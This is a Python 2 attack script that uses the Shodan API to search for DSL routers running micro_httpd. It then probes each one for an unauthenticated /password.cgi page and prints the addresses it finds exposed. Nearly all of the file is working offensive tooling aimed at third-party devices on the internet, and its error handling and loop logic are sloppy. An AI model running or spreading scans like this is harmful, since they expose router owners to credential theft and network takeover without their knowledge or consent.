#!/usr/bin/env python
# -*- coding: utf-8 -*-
#                  _       _   
#      ___ ___ _ _| |_ ___| |_ 
#     |  _| . | | |  _| -_|   |
#     |_| |___|___|_| |___|_|_|
#         
# jh00nbr
# 
# Fix by rand0m1ze - https://github.com/rand0m1ze

#Dependencias
# apt-get install python-shodan 
# easy_install shodan

import shodan
import re,socket
import os
import sys

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

 
os.system('clear')
print '               _       _    '
print '   ___ ___ _ _| |_ ___| |_  '
print '  |  _| . | | |  _| -_|   |  '
print '  |_| |___|___|_| |___|_|_|  '
print '                              '
print '  * Search for model vulnerable routers on port 80 with page password.cgi without authentication'
print ' /----------------------------'

 
def checar(ip):
         try:
                 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
                 sock.settimeout(1.5)
 
                 sock.connect((ip,80))
 
                 sock.send('GET /password.cgi HTTP/1.0\r\n\r\n')
 
                 res = sock.recv(100)
 

                 if(res.find('200 Ok') > 0):
 
                         return True
 
                 return False
 
         except:
 
                 return False

#if __name__ == "__main__":
	                     
api = shodan.Shodan("SHODAN_API_KEY")  #Shodan API key with quotations
res = api.search('DSL Router micro_httpd') #Shodan Dork
i = 1
try:
         while i <= 100: #Will printar only 100 results for the API to be free
 
                 for ips in res['matches']:
 
                         print '[!] Testing http://%s' % ips['ip'] + bcolors.WARNING + '  :('+ bcolors.ENDC, bcolors.OKBLUE, ips['port'], bcolors.FAIL, ips['timestamp'], bcolors.ENDC, bcolors.HEADER, ips['org'], bcolors.ENDC
 
                         if(checar(ips['ip'])):
							 
                                 print '[+] Is vull: http://%s/password.cgi' % ips['ip']
                                               
                 i +=1												
except():
         print 'Failed'
 
 
